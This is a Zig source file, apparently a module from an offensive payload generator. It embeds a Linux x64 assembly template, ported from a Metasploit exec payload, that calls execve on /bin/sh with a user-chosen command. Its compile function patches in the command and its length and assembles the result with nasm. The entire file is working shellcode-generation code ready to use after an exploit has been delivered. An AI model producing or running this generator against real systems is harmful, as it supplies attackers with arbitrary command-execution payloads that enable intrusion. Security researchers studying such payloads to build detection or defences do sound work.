const std = @import("std");
const common = @import("../../../common/lib.zig");
const utils = @import("../../utils.zig");

// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/linux/x64/exec.rb
const asm_code =
    \\section .text
    \\  global _start
    \\_start:
    \\  ; execve("/bin/sh", ["/bin/sh", "-c", "*CMD*"], NULL)
    \\
    \\  mov rax, 0x68732f6e69622f2f ; "//bin/sh"
    \\  cdq                         ; edx = NUL <- 3rd argument of execve
    \\  jmp tocall                  ; jmp/call/pop cmd address
    \\afterjmp:
    \\  pop rbp                     ; *CMD*
    \\  push rdx
    \\  pop rbx
    \\  {OP_MOV}                    ; bl/bx (byte/word), cmd_length
    \\  mov [rbp + rbx], dl         ; null-terminator ('\0')
    \\  push rdx
    \\  dd 0x632d6866
    \\  push rsp
    \\  pop rsi                     ; "-c"
    \\  push rdx
    \\  push rax
    \\  push rsp
    \\  pop rdi                     ; "//bin/sh"
    \\  push rdx                    ; NULL
    \\  push rbp                    ; *CMD*
    \\  push rsi                    ; "-c"
    \\  push rdi                    ; "//bin/sh"
    \\  push rsp
    \\  pop rsi                     ; ["//bin/sh", "-c", "*CMD*"]
    \\  push 0x3b                   ; syscall number (59 = execve)
    \\  pop rax
    \\  syscall
    \\tocall:
    \\  call afterjmp
    \\  db "{CMD}"
;

pub fn compile(
    allocator: std.mem.Allocator,
    asm_src_path: []const u8,
    asm_dest_path: []const u8,
    cmd: []const u8,
) !void {
    // Get mov op
    if (cmd.len > 0xffff) {
        try common.stdout.print("Command is too big (> 0xffff).", .{});
        return;
    }
    var reg: []const u8 = "";
    if (cmd.len <= 0xff) {
        reg = "bl";
    } else {
        reg = "bx";
    }
    const op_mov = try std.fmt.allocPrint(allocator, "mov {s}, 0x{x}", .{ reg, cmd.len });
    try common.stdout.print("op_mov: {s}\n", .{op_mov});

    // Replace {OP_MOV}
    var asm_code_size = std.mem.replacementSize(u8, asm_code, "{OP_MOV}", op_mov);
    const asm_code_new_1 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code, "{OP_MOV}", op_mov, asm_code_new_1);
    // Replace {CMD}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_1, "{CMD}", cmd);
    const asm_code_new = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_1, "{CMD}", cmd, asm_code_new);

    try utils.compile_with_nasm(
        allocator,
        "elf64",
        asm_src_path,
        asm_dest_path,
        asm_code_new,
    );
}
